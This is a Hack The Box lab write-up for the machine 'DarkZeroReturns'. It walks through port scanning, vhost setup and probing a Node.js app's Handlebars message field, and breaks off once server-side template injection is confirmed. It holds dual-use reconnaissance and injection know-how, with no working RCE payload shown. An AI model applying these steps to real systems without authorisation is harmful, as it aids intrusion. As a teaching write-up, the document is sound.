---
link: https://app.hackthebox.com/machines/DarkZeroReturns?sort_by=created_at&sort_type=desc
description: Hard·Windows
release date: 2026-07-25
tags:
  - SN_11
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb32a5-8e1c-4d62-bf6e-d2041d6448ad-1781002585.png
solved: true
solve date: 2026-07-29
machine no.: 10
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">DarkZeroReturns Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb32a5-8e1c-4d62-bf6e-d2041d6448ad-1781002585.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): 0xEr3bus & Pho3o</p>
    <p style="margin: 0;">Difficulty: Hard</p>
    <p style="margin: 0;">Date: 29 Jul 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Attack Chain Summary

**Category:** Web Exploitation → Active Directory. Web comes first: the only externally reachable application is a Node.js campaign manager that parses `campaign_message` as a raw Handlebars AST instead of a string, which is server-side template injection straight into RCE. Everything after the foothold is Active Directory — a domain-joined Linux server, Kerberos SSPI against an internal Gitea, CI/CD runner abuse, an OU ACL, and a bidirectional forest trust with "Treat as External" SID filtering. That last stage is what makes it Hard; the SID filter behaves the opposite of what most people assume, and the root path depends on knowing which SIDs survive the boundary.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery

### 1.1 Connect to Hack The Box

**Why this step:** The target resides on an isolated network reachable only through Hack The Box's VPN. Establish the tunnel before any interaction with the machine.

**Command:**

Download your personalised `.ovpn` configuration file from Hack The Box, then:

```bash
sudo openvpn your_file.ovpn
```

Start the machine from the Hack The Box web interface and note the assigned target address.

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`sudo`|Elevate privileges|OpenVPN creates a network interface, which requires root|
|`openvpn`|VPN client|Builds the encrypted tunnel|
|`your_file.ovpn`|Personalised configuration|Contains the server address, certificates, and keys tied to your account|

**Next:** Confirm the target responds before committing time to scanning.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 1.2 Verify Target is Reachable

**Why this step:** The VPN is established but unverified. Confirm the target answers before spending time on scans that would otherwise fail silently.

**Command:**

```bash
ping -c 4 TARGET_IP
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ping`|Sends ICMP echo requests|Asks "are you there?" and waits for a reply|
|`-c 4`|Stop after 4 packets|Otherwise it runs forever until interrupted|
|`TARGET_IP`|Destination host|The HTB machine address assigned to your instance|

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ ping -c 4 10.129.53.206
PING 10.129.53.206 (10.129.53.206) 56(84) bytes of data.
64 bytes from 10.129.53.206: icmp_seq=1 ttl=127 time=236 ms
64 bytes from 10.129.53.206: icmp_seq=2 ttl=127 time=234 ms
64 bytes from 10.129.53.206: icmp_seq=3 ttl=127 time=231 ms
64 bytes from 10.129.53.206: icmp_seq=4 ttl=127 time=242 ms

--- 10.129.53.206 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 231.415/235.706/241.509/3.743 ms
```

**What this gives you:** Confirmation that the VPN tunnel and target are both live.

**Key findings:**

- Zero packet loss across four probes. The tunnel is functional and the host is responding.
- **TTL 127 indicates an initial TTL of 128 decremented by a single hop.** An initial TTL of 128 is the Windows default; Linux defaults to 64. Treat the host as Windows-family for now and revisit if service banners contradict it.
<div align="center"> <br> <br> </div>

##### Why TTL leaks the operating system

Every IP packet carries a Time To Live counter. Each router that forwards the packet decrements it by one, and when it reaches zero the packet is discarded — this is what stops packets circling a broken network forever.

The useful part for an attacker is the _starting_ value, because operating systems don't agree on it. Linux and most Unix systems start at 64. Windows starts at 128. Some network appliances start at 255.

So when a reply arrives with TTL 127, work backwards: 128 − 127 = 1 router hop between you and the target, and the starting value was 128, meaning Windows. A reply of 63 would mean Linux one hop away.

This is a hint, not proof — TTL can be rewritten by firewalls, and a Windows host can front a Linux application, or vice versa. It costs nothing and it is right most of the time. On this box it turns out to be misleading in an instructive way: the edge host is Linux, and the Windows characteristics belong to infrastructure behind it.

**Next:** With reachability confirmed, enumerate the full TCP port range to establish the exposed attack surface.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※ <br> </div> <!-- PAGE BREAK --> <div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

#### 2.1.1 Full Port Sweep

**Why this step:** Reachability is confirmed but the attack surface is unknown. Scan the full port range rather than nmap's default top 1000, since a service on a high port is a common way for boxes to hide their real entry point.

**Command:**

```bash
nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`nmap`|Port scanner|Knocks on every door and notes which ones open|
|`-p-`|Scan ports 1–65535|The full range, not just the common ones|
|`--min-rate 5000`|Send at least 5000 packets/sec|Forces speed; a full-range scan at default rate takes many minutes|
|`-Pn`|Skip host discovery|Treat the host as up without pinging first — already verified manually|
|`TARGET_IP`|Target|The HTB machine|
|`\| grapo`|Custom zsh function|Prints full nmap output to the terminal while extracting open ports as a comma-joined list for copying into the follow-up scan|

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 5000 -Pn 10.129.53.206 | grapo
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-27 06:59 +0000
Nmap scan report for 10.129.53.206
Host is up (0.46s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.33 seconds

22,80
```

**What this gives you:** A minimal external footprint — two open ports, 65533 filtered.

**Key findings:**

- Only 22/tcp (SSH) and 80/tcp (HTTP) are exposed. No SMB (445), no LDAP (389), no Kerberos (88) — none of the ports that normally advertise a Windows domain controller.
- Combined with the TTL 127 reading from 1.2, this points to a Windows environment sitting _behind_ something, with a Linux-style host exposed at the edge.
- Treat HTTP as the primary attack surface and SSH as a likely post-credential path rather than an entry point.

**Next:** Fingerprint both services to identify software and versions before probing the web application.
<div align="center"> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> </div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Why this step:** Two ports are confirmed open but the software behind them is unknown. Run service and version detection against only those ports to identify software, versions, and any immediate script findings.

**Command:**

```bash
nmap -A -p 22,80 TARGET_IP
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`nmap`|Port scanner|The scanning tool|
|`-A`|Aggressive mode|A superset that bundles four things at once: version detection, default NSE scripts, OS detection, and traceroute|
|`-p 22,80`|Restrict to these ports|Only the ports the full scan found open — no wasted time|
|`TARGET_IP`|Target|The HTB machine|

(`-A` is equivalent to `-sC -sV -O --traceroute` combined.)

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -A -p 22,80 10.129.53.206
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-27 07:05 +0000
Nmap scan report for 10.129.53.206
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://dzcampaigns.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   244.38 ms 10.10.14.1
2   244.41 ms 10.129.53.206

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.90 seconds
```

**What this gives you:** Software and version identification for both exposed services, plus a contradiction worth resolving.
<div align="center"> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> </div>

#### 2.1.3 Scan Results Analysis

**Scan results:**

|Port|Service|Version|Analysis|Simple Explanation|
|---|---|---|---|---|
|22/tcp|SSH|OpenSSH 9.6p1 Ubuntu 3ubuntu13.18|Current release, no known exploitable CVEs. No entry point without credentials.|Remote login for Linux. Useless until a username and password turn up.|
|80/tcp|HTTP|nginx 1.24.0 (Ubuntu)|Reverse proxy. Redirects to a named vhost, so the real app is not served on the bare IP.|The web server. It won't show the real site until you ask for it by name.|

**Key findings:**

- The host serving both ports is Ubuntu Linux, contradicting nmap's Windows OS guess. The OS fingerprint carries an explicit reliability warning — with 65533 ports filtered, nmap lacked the open/closed port pair it needs for accurate stack fingerprinting. Trust the service banners over the guess: the edge host is Linux, and the Windows signals belong to infrastructure behind it.
- nginx redirects to the virtual host `dzcampaigns.htb`. Resolve this name locally before any web enumeration, or every request returns the redirect instead of the application.
<div align="center"> <br> <br> </div>

##### Virtual hosts and why the redirect matters

One web server can host many different websites on a single IP address. The way it decides which site to serve is the `Host` header — a line your browser sends with every request saying which name you typed. Request `dzcampaigns.htb` and nginx serves the campaign application; request the bare IP address and nginx has no matching site configuration, so it redirects you to the name it expects.

The problem is that `dzcampaigns.htb` isn't a real registered domain. Public DNS has never heard of it, so your machine can't resolve it to an address and the redirect goes nowhere.

The fix is `/etc/hosts`, ==a plain text file your system consults before asking DNS==. Adding a line there that maps `dzcampaigns.htb` to the target IP means your browser resolves the name locally, sends the correct `Host` header, and nginx serves the real application. This is a routine first move on almost every HTB web box — whenever a scan mentions a `.htb` domain, that domain goes in `/etc/hosts` immediately.

**Next:** Map the virtual host name to the target IP locally so the application becomes reachable.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 2.2 Resolve the Virtual Host Locally

**Why this step:** Nginx redirects requests for the bare IP to `dzcampaigns.htb`, a name public DNS cannot resolve. Map the name to the target address in the local hosts file so requests carry the correct `Host` header and reach the application.

**Command:**

```bash
sudo vi /etc/hosts
```

Append the following line:

```
TARGET_IP    dzcampaigns.htb
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`sudo`|Elevate privileges|`/etc/hosts` is system-owned and not writable by a normal user|
|`vi`|Text editor|Opens the file for editing|
|`/etc/hosts`|Local resolution table|Consulted before DNS; maps IP addresses to hostnames|
|`TARGET_IP dzcampaigns.htb`|The mapping entry|Sends any request for that name to the target machine|

Note the format: address first, then one or more names separated by whitespace. No protocol scheme, no port, no path — the file resolves names to addresses and nothing more.

**Verify:**

```bash
curl -I http://dzcampaigns.htb/
```

|Component|Purpose|Simple Explanation|
|---|---|---|
|`curl`|Command-line HTTP client|Fetches a URL without a browser|
|`-I`|HEAD request only|Returns response headers and skips the page body — fast confirmation the host resolves and answers|

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -I http://dzcampaigns.htb/
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 27 Jul 2026 15:04:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2344
Connection: keep-alive
ETag: W/"928-OsnbcztKl7ijbe9shRmPWv/KaWM"
Set-Cookie: dz.sid=s%3A3Ku4I0ZOarjEdq2eSHLVXwAC8bL_ukEw.VdbqE3O8Q%2BoZvw0c8lnMtVDzvxpwOzYf16Ysxi8cV24; Path=/; Expires=Tue, 28 Jul 2026 15:04:02 GMT; HttpOnly; SameSite=Lax
```

**What this gives you:** HTTP 200 replaces the earlier redirect — the virtual host now resolves and the application responds.

**Key findings:**

- The `Set-Cookie: dz.sid=s%3A...` header identifies an Express.js session cookie. The `s%3A` prefix is URL-encoded `s:`, which is how Express marks a signed cookie.
- Combined with the weak `ETag` format nginx is passing through, this confirms a Node.js/Express application behind the nginx reverse proxy. Node.js is significant: it makes JavaScript-based template engines — and their injection vulnerabilities — a realistic attack surface.

**Next:** Browse the application to identify functionality, authentication endpoints, and user-controllable input.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 2.3 Web Enumeration
#### 2.3.1 Enumerate application functionality as an unauthenticated user

**Why this step:** The application responds on the resolved vhost but its purpose and input surface are unknown. Browse every page reachable without credentials to map functionality before attempting authentication.

**Action:**

Open the following in a browser:

- `http://dzcampaigns.htb/`
- `http://dzcampaigns.htb/essentials`
- `http://dzcampaigns.htb/dice`
- `http://dzcampaigns.htb/login`

**Result:**

`/` — "DarkZero Campaigns", a tabletop RPG campaign tracker. Displays ACTIVE CAMPAIGNS with a single entry, "The Clockwork Moon and the Thieves of Dawn", plus its narrative description, and a RECENT HEROES section listing one character: `Thomas — Goblin Guardian`.

![[dzcampaigns_home.png]]

`/essentials` — Documentation covering campaigns, character creation, inventory, dice, and a Coming Soon list.

![[dzcampaigns_essentials.png]]

`/dice` — Dice roller: DIE selector (default "6 sided"), COUNT field (default 1), ROLL button.

![[dzcampaigns_dice.png]]

`/login` — Authentication form.

![[dzcampaigns_login.png]]

**Endpoint map (unauthenticated):**

|Path|Nav label|Function|Input surface|Simple Explanation|
|---|---|---|---|---|
|`/`|HOME|Lists active campaigns and recent heroes|None|The front page — shows what's going on|
|`/essentials`|ESSENTIALS|Application documentation|None|A help page explaining the app's own features|
|`/dice`|ROLL DICE|Server-side dice roller|Die type (select), count (numeric)|Rolls dice for you; only accepts numbers|
|`/login`|LOGIN|Authentication form|Email, password|Where you sign in|

**What this gives you:** A complete map of pre-authentication functionality, plus a written description of what the application does _after_ authentication.

**Key findings:**

- The Essentials page documents the campaign-join mechanic directly — when a character joins a campaign, an entry is appended to the campaign log so other users see the new arrival. User-controlled data is being rendered into generated output. Combined with the Express.js fingerprint from 2.2, a JavaScript templating engine performs that rendering, making server-side template injection the leading hypothesis.
- Character creation is labelled "(Being Updated)" and takes four user-supplied fields: Name, Race, Class, Backstory. The Coming Soon list includes "Post updates to campaigns your character is part of", reinforcing that character data feeds a message-rendering path.
- The navigation bar exposes only four destinations and no registration link, yet the Essentials workflow lists "Register or log in" as step 1. Account creation exists but is unlinked from the navigation.
- **Dead end:** the dice roller at `/dice` accepts only a die type and a numeric count — constrained inputs feeding server-side arithmetic, with no free-text surface. Deprioritised against character creation.

**Note on method:** Read paths from the anchor `href` attributes rather than inferring them from nav link text. The label "ROLL DICE" points at `/dice`, not `/roll`.
<div align="center"> <br> <br> </div>

##### Why "user input rendered into output" is the phrase to react to

Web applications constantly build strings out of things users typed. A template is a fill-in-the-blanks document: the developer writes something like `A new face emerges! The {{race}} {{class}} {{name}} has joined the campaign.` and the template engine substitutes real values into the placeholders.

That is normal and safe, provided the _template_ comes from the developer and only the _values_ come from the user.

Server-side template injection happens when the user controls the template itself. Instead of your name being dropped into a blank, the text you typed gets parsed as template syntax and executed. Template engines are small programming languages — they evaluate expressions, call helper functions, and in some engines reach the host language's runtime. In a Node.js application, reaching the runtime means reaching `require('child_process')`, which means running shell commands on the server.

The reaction to train, then: does this application let me influence _what gets rendered_, rather than just _what gets substituted_? An app that documents its own "append a message to the log" feature and hides a customisable message field behind login is exactly that shape.

**Next:** Locate the unlinked registration endpoint and create an account to reach the authenticated character-creation flow.

<div align="center"> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> </div>

#### 2.3.2 Register an account and authenticate

**Why this step:** Enumeration established that character creation — the suspected template-rendering surface — sits behind authentication, and that the Essentials workflow begins with registration. Create an account to reach it.

**Action:**

Navigate to the login page and follow the registration link in the body text beneath the form:

![[dzcampaigns_login_register_here.png]]

Submit the registration form at `/register` by clicking CREATE ACCOUNT after entering the required details.

![[dzcampaigns_register.png]]

|Field|Notes|
|---|---|
|EMAIL|Any syntactically valid address; no verification performed|
|USERNAME|Displayed publicly on characters and campaign entries|
|PASSWORD|Policy enforced: minimum 10 characters, upper- and lower-case, a number|

Registration redirects to `/login`. Authenticate with the same email and password.

**Result:**

Login succeeds and redirects to `/dashboard`.

![[dzcampaigns_dashboard.png]]

**What this gives you:** An authenticated session with access to the character-management area.

**Key findings:**

- Registration is open, unverified, and requires no invitation or approval. Any unauthenticated attacker can self-provision an account and reach the entire authenticated attack surface. This is the sole prerequisite for the exploitation chain that follows.
- The dashboard exposes a CREATE CHARACTER action and the character routes it links to. The character-creation flow is now reachable.
- If the chosen password contains shell metacharacters such as `<`, `#`, or `*`, quote it with single quotes in any later Python or bash automation, or `#` will comment out the remainder of the line.

**Next:** Open the character-creation form and enumerate its fields, paying particular attention to any field whose contents are rendered into campaign output.

<div align="center"> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> </div>

#### 2.3.3 Enumerate the character creation form

**Why this step:** Authentication is established and the dashboard exposes a CREATE CHARACTER action. Inspect every field on the form before submitting anything, to identify which inputs are treated as data and which are treated as instructions.

Read the form without submitting.

![[dzcampaigns_character_new.png]]

**Result — form field inventory:**

|Field|Type|Placeholder / default|Analysis|Simple Explanation|
|---|---|---|---|---|
|NAME|text|`e.g. Aelar the Bold`|Free text. Rendered as a value.|The character's name — just a label|
|RACE|text|`e.g. Elf, Dwarf, Human`|Free text. Rendered as a value.|Elf, dwarf, human — just a label|
|CLASS|text|`e.g. Rogue, Wizard, Paladin`|Free text. Rendered as a value.|Rogue, wizard, paladin — just a label|
|BACKSTORY|textarea|`Who are they? Where do they come from?`|Free text. Rendered as a value.|Flavour text about the character|
|JOIN CAMPAIGN (OPTIONAL)|select|`— Do not join a campaign —`|Constrained dropdown. Gates the field below.|Pick which story the character joins|
|CUSTOM CAMPAIGN MESSAGE|textarea|`A custom arrival message, if you wish. Default template:`<br>`A new face emerges! The {{race}} {{class}} {{name}} has joined the campaign…`|**User-writable template.** Contains Mustache/Handlebars placeholder syntax. Disabled client-side until a campaign is selected.|The announcement posted when your character joins — and you get to write it yourself|

**What this gives you:** A clear separation between fields carrying data and the one field carrying logic.

**Key findings:**

- The CUSTOM CAMPAIGN MESSAGE field accepts a **template**, not a value. Its own placeholder text demonstrates the syntax — `{{race}}`, `{{class}}`, `{{name}}` — which is Mustache-family templating. In a Node.js/Express application, the dominant implementation of that syntax is ==Handlebars.js==. The application permits a user to supply the template that the server will compile and render. This makes server-side template injection the primary attack path.
- The message field is visually disabled with the annotation "available once a campaign is chosen". Field disabling is enforced in the browser via the HTML `disabled` attribute. It prevents interaction in the UI but does not prevent the parameter from being included in a crafted HTTP request. Treat the gate as advisory only.
- The default template references `{{race}}`, `{{class}}`, and `{{name}}` — the same three fields present above it. This confirms the four data fields are passed into the rendering context, meaning the template executes with access to a context object populated from user input.

<div align="center"> <br> <br> </div>

##### Handlebars, and what "compiling a template" means

Handlebars is a templating engine for JavaScript. You hand it a template string and a context object, and it hands you back finished text.

```
Template:  "Hello {{name}}, welcome to {{place}}."
Context:   { name: "Ned", place: "Virelia" }
Output:    "Hello Ned, welcome to Virelia."
```

The important part is _how_ it does this. Handlebars does not perform a simple find-and-replace. It runs the template through two stages:

1. **Parse.** The template string is read and converted into an **AST** — an Abstract Syntax Tree. This is a structured object describing what the template means: "here is literal text", "here is a mustache statement that looks up the variable `name`", "here is a block helper". The braces are gone by this point; what remains is a tree of typed nodes.
2. **Compile and execute.** The AST is walked and turned into an actual JavaScript function, which is then called with the context object to produce output.

Stage 2 is the dangerous one, because "turned into an actual JavaScript function" means the contents of the AST end up as executable code inside the Node.js process. Handlebars normally guards this carefully — the parser only ever produces well-formed nodes, so nothing unexpected can reach the code generator.

That guarantee holds only as long as the AST comes from the parser. If an attacker can supply the AST **directly**, skipping the parse stage, they can construct nodes the parser would never emit — nodes containing arbitrary JavaScript in fields the compiler expects to hold simple values. That is the shape of the vulnerability on this box, and it is why the next few steps focus on how the message field is transmitted rather than just what text it accepts.

**Next:** Submit a character joining the campaign with the default message intact, to establish baseline rendering behaviour and locate where the output appears.

<div align="center"> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> </div>

#### 2.3.4 Submit a baseline character and locate the rendered output

**Why this step:** The campaign message field accepts a template, but the destination of the rendered result is unknown. Submit a character with entirely benign values and the default template to establish normal behaviour before introducing any payload.

**Action:**

At `http://dzcampaigns.htb/character/new`, fill in the form and submit.

|Field|Value|
|---|---|
|NAME|`Testchar`|
|RACE|`Elf`|
|CLASS|`Rogue`|
|BACKSTORY|`test`|
|JOIN CAMPAIGN|`The Clockwork Moon and the Thieves of Dawn`|
|CUSTOM CAMPAIGN MESSAGE|_(left empty — server applies the default template)_|

![[dzcampaigns_baseline_form.png]]

**Result — dashboard:**

Submission redirects to `/dashboard`. No character ID appears in the URL. The character is listed with three actions: INVENTORY, EDIT, DELETE.

![[dzcampaigns_dashboard_testchar.png]]

**Result — homepage:**

The RECENT HEROES section now lists the new character above the pre-existing one.

![[dzcampaigns_home_testchar.png]]

**Result — campaign page (`/campaign/1`):**

```
Messages

A new face emerges! The Goblin Guardian Thomas has joined the campaign...
Sun Apr 19 2026 15:45:03 GMT+0000 (Coordinated Universal Time)

A new face emerges! The Elf Rogue Testchar has joined the campaign...
Mon Jul 27 2026 22:44:49 GMT+0000 (Coordinated Universal Time)
```

![[dzcampaigns_campaign1_messages.png]]

**What this gives you:** The full input-to-output path for the template, end to end.

**Key findings:**

- Rendered template output appears in the MESSAGES section of `/campaign/<id>`. The default template `A new face emerges! The {{race}} {{class}} {{name}} has joined the campaign...` rendered as `A new face emerges! The Elf Rogue Testchar has joined the campaign...`. Placeholders were substituted, in template order, with the values supplied in the character form. This is server-side template compilation with a context object built from user input — confirming the hypothesis from 2.3.1 and 2.3.3.
- The campaign page is `/campaign/1`. Its numeric identifier is required for any request that targets the join action directly.
- The pre-existing message from user Thomas, dated `Sun Apr 19 2026`, uses the same default template. A single shared rendering pipeline handles all arrival messages; it is not a per-character code path.
- The homepage renders only name, race, and class — never the message. The campaign page is the only location where template output is displayed. Direct all injection verification there.
- Submission redirects to `/dashboard` rather than to a character detail page, so the character ID is not exposed in the address bar at creation time. Retrieve it from the EDIT action instead.

**Next:** Retrieve the character ID from the EDIT action to obtain a repeatable submission endpoint, then probe the message field with Handlebars syntax to confirm server-side evaluation.

<div align="center"> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> </div>

#### 2.3.5 Obtain the character ID and a repeatable submission endpoint

**Why this step:** Creation redirects to the dashboard without exposing a character ID, and creating a fresh character per test is slow. Retrieve the ID from the EDIT action to obtain an endpoint that can be submitted repeatedly against the same campaign.

**Action:**

From `/dashboard`, click EDIT on the character row.

**Result:**

Browser navigates to `http://dzcampaigns.htb/character/<id>/edit`.

![[dzcampaigns_character16_edit.png]]

Form contents:

|Field|Value on load|Difference from creation form|
|---|---|---|
|NAME|`Testchar`|Pre-populated with stored value|
|RACE|`Elf`|Pre-populated with stored value|
|CLASS|`Rogue`|Pre-populated with stored value|
|BACKSTORY|`test`|Pre-populated with stored value|
|JOIN CAMPAIGN|_(absent)_|Dropdown removed — campaign binding is fixed|
|UPDATE CAMPAIGN MESSAGE|_(empty)_|Relabelled; annotated "posts to The Clockwork Moon and the Thieves of Dawn (optional)"; **not disabled**|

Submit button reads **SAVE CHANGES**.

**What this gives you:** A stable, repeatable endpoint that renders a template into `/campaign/1` on every save.

**Key findings:**

- The edit route follows the pattern `/character/<id>/edit`, and the underlying update is submitted to `/character/<id>`.
- The message field on the edit form carries no `disabled` attribute — the client-side gate present on the creation form is absent here entirely. No dropdown manipulation is required to reach the template surface.
- The field loads empty rather than displaying the previously stored template, and the label changes from "custom arrival message" to "update campaign message". Each save appends a new message to the campaign rather than modifying the existing one, so test iterations accumulate as separate entries and require no cleanup between attempts.

**Testing loop established:**

```
POST /character/<id>  (via SAVE CHANGES)  →  view http://dzcampaigns.htb/campaign/1
```

**Note on identifiers:** This engagement spanned several machine instances. Character IDs and flag values differ between them. Commands below use `15`; substitute whatever ID your own instance assigns.

**Next:** Probe the message field with Handlebars control syntax to confirm the input is parsed as a template rather than escaped as literal text.

<div align="center"> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> </div> 

#### 2.3.6 Probe the message field to confirm and characterize template injection

**Why this step:** The CUSTOM CAMPAIGN MESSAGE field accepts what appears to be Handlebars syntax, and its own placeholder text demonstrates `{{race}} {{class}} {{name}}`. Submit a graded series of probes to establish first whether input is compiled at all, then where the language's limits lie.

**Commands:**

Enter each payload into UPDATE CAMPAIGN MESSAGE at `http://dzcampaigns.htb/character/15/edit`, click SAVE CHANGES, and check `http://dzcampaigns.htb/campaign/1` after each.

```handlebars
{{#if true}}yes{{/if}}
```

```handlebars
{{77}}
```

```handlebars
{{{77}}}
```

```handlebars
{{7*7}}
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`{{ }}`|Mustache expression, HTML-escaped output|The standard "put something here" marker|
|`{{{ }}}`|Mustache expression, unescaped output|Same, but outputs raw HTML instead of escaping it|
|`{{#if ...}}` … `{{/if}}`|Block helper with condition and body|An "only show this if…" section|
|`true`|Condition argument|Always true, so the body always renders|
|`yes`|Block body|The marker string to look for in output|
|`77`|Bare numeric token — a syntactically valid path|Tests whether a valid but non-existent name resolves|
|`7*7`|Arithmetic expression containing `*`|Tests whether the language permits computation|

The block helper is the load-bearing probe. A bare placeholder like `{{name}}` could be explained by simple string substitution; a conditional block cannot. It only collapses to its body if the input was parsed into a syntax tree and executed.

**Result:**

`{{#if true}}yes{{/if}}` — renders as `yes`:

```
A new face emerges! The Goblin Guardian Thomas has joined the campaign...
Sun Apr 19 2026 15:45:03 GMT+0000 (Coordinated Universal Time)

A new face emerges! The Elf Rogue Testchar has joined the campaign...
Tue Jul 28 2026 18:58:00 GMT+0000 (Coordinated Universal Time)

yes
Tue Jul 28 2026 18:58:43 GMT+0000 (Coordinated Universal Time)
```

![[dzcampaigns_ssti_confirmed.png]]

`{{77}}` — saves successfully, message body empty:

```
(no text)
Tue Jul 28 2026 19:02:25 GMT+0000 (Coordinated Universal Time)
```

`{{{77}}}` — identical to `{{77}}`: saves successfully, message body empty. Arbitrary alphanumeric strings behave the same way.

`{{7*7}}` — save fails. Browser remains at `/character/15` and displays an application error page. No message is written to `/campaign/1`:

```
Something Went Amiss
Something went wrong. Please try again.
[ ← GO BACK ]
```

![[dzcampaigns_7x7_parse_error.png]]

**What this gives you:** Confirmation of the vulnerability plus a map of the engine's behaviour across three distinct input classes.

|Input|Outcome|Cause|Simple Explanation|
|---|---|---|---|
|`{{#if true}}yes{{/if}}`|Renders `yes`|Valid syntax, helper evaluated|Understood and obeyed|
|`{{77}}`, `{{{77}}}`, `{{abc123}}`|Empty message saved|Valid syntax, lookup returned undefined|Understood, but there was nothing to fetch|
|`{{7*7}}`|Server error, nothing saved|**Invalid syntax — parser threw**|Not understood; refused outright|

**Key findings:**

- **Server-side template injection confirmed.** `{{#if true}}yes{{/if}}` rendered as `yes`. All syntax was consumed and the conditional evaluated server-side. Had the field been treated as inert text the campaign page would display the input verbatim; had it been HTML-escaped it would display the braces as entities. Neither occurred.
- Output is stored, not merely reflected. The rendered result persists on `/campaign/1` and is visible to every visitor, making this a stored injection rather than a transient one.
- `{{77}}` renders empty. The expression is a syntactically valid path, so the parser accepts it; the context object contains no key named `77`, so the lookup returns undefined, and Handlebars renders undefined as empty by design. Failed lookups degrade silently and must not be read as rejection.
- Escaped and unescaped forms behave identically. `{{{77}}}` produces the same empty result as `{{77}}`, so HTML-escaping is not the operative constraint and offers no leverage.
- **The parser is provably executing on submitted strings.** `{{7*7}}` raises a server-side exception because `*` is not a legal character in a Handlebars path expression. The engine tokenises the input, fails to match its grammar, and throws before any rendering occurs. Silent empty output and a hard error are produced by two different stages — lookup failure versus parse failure.
- Handlebars supports no arithmetic. Unlike Jinja2 or FreeMarker, where `{{7*7}}` returns `49`, the language has no expression evaluation at all. Escape techniques that rely on the template language computing values are unavailable here.
- The application applies no sanitisation or filtering before invoking the engine. Input reaches Handlebars unfiltered; the only constraint is the engine's own grammar.
<div align="center"> <br> <br> </div>

##### What a template is, and what went wrong here

Think of a form letter. Someone writes it once, with blanks:

> "Dear `<<name>>`, your appointment is on `<<date>>`."

The blanks get filled in per person. The letter itself never changes; only what goes in the blanks changes. That's a template. The letter is the template, the names and dates are the values.

This application has a template. Its form letter reads:

> "A new face emerges! The `{{race}}` `{{class}}` `{{name}}` has joined the campaign."

Those `{{ }}` marks are the blanks. On character creation the server fills them with Elf, Rogue, Testchar and posts the result.

**The mistake.** Users are supposed to fill in blanks. They are not supposed to be handed the letter itself and told "write whatever you like." That is exactly what CUSTOM CAMPAIGN MESSAGE does — it asks for the whole form letter rather than a value to slot in. The user writes the letter; the server reads it and does what it says.

